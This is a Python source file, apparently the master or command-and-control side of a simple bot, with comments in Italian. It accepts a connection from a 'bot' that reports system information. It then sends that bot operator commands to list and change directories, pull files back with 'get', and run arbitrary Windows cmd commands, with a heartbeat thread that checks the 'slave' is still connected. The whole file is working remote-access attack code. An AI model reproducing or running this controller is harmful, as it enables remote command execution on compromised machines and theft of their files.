from socket import *
import threading
import time

checkConnectionPort = 23000
serverPort = 6677
serverName = 'localhost'          #0.0.0.0 default
# Thread che periodicamente fa scambiare messaggi tra master e slave per controllare che non si sia disconnesso lo slave
def checkConnection():
    checkSocket = socket(AF_INET, SOCK_STREAM)
    checkSocket.bind((serverName, checkConnectionPort))
    checkSocket.listen(1)
    checkSocketConnection, checkAddr = checkSocket.accept()
    checkSocket.settimeout(3)
    while True:
        checkSocketConnection.send('0'.encode())
        message = checkSocketConnection.recv(1).decode()
        if message != '0':
            raise Exception("Opps!!!")
        time.sleep(5)


while True:
    try:
        # AF_INET = IPV4; SOCK_STREAM = TCP
        serverSocket = socket(AF_INET, SOCK_STREAM)
        serverSocket.bind((serverName, serverPort))
        serverSocket.listen(1)
        # dichiarato il thread che ha come target la funzione checkConnection
        threadCheckConnection = threading.Thread(target=checkConnection, args=())
        threadCheckConnection.start()

        print('The server is ready to receive')
        connectionSocket, addr = serverSocket.accept()
        print('Accepted a new client', addr)
        infoBot = connectionSocket.recv(4096).decode()
        print('Informazioni ottenute: \n', infoBot)
        connectionSocket.send('ok'.encode())
        command = ''
        while command != 'exit':
            print('Commands: ls, cd, get [file_name], cmd commands (on Windows systems)')
            command = input('Input a command:	')
            print(command)
            if command == 'ls':
                connectionSocket.send('ls'.encode())
                ls = connectionSocket.recv(1024).decode()
                cwd = connectionSocket.recv(1024).decode()
                print(ls)
                print('Current working directory:	', cwd)

            if command == 'exit':
                connectionSocket.send('exit'.encode())
                break

            if command.startswith('cd') and command[1:].strip():
                if len(command) != 2:
                    string = '1'+command.split(" ")[1]
                    connectionSocket.send(string.encode())
                    print('New path:	', connectionSocket.recv(1024).decode())

            if command.startswith('get') and command[1:].strip():
                string = '0'+command.split(" ")[1]
                connectionSocket.send(string.encode())
                data = connectionSocket.recv(90000000).decode()
                file = open(string[1:], "w")
                print("Receiving the file data.")
                file.write(data)
                file.close()

            if command != 'ls' and command != 'exit' and not command.startswith('cd') and not command.startswith('get'):
                connectionSocket.send(command.encode())
                out = connectionSocket.recv(1024).decode()
                print(out)
        print("Connessione col socket persa")
        connectionSocket.close()
    except:
        connectionSocket.close()
        print('Connection lost, retrying...')
        continue
    break
